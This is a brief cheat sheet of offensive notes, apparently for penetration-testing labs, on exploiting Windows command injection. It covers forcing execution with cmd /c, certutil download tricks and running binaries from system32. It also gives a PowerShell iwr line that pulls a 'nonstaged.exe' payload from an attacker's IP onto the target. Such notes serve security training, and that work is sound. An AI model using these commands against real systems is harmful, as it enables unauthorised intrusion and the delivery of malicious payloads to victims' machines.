# RCE / Command Injection
- If normal command execution doesn't work, try to use `cmd /c <your command here>`.
- You can add `certutil.exe` command without the name of the output file.
- You can add `certutil.exe` URL without single/double quotes.
- If you cannot run executables like whoami, systeminfo; then go to `C:\Windows\system32` folder to run this commands, because they may not be on our `PATH`.

# File Transfer
```
iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe
```
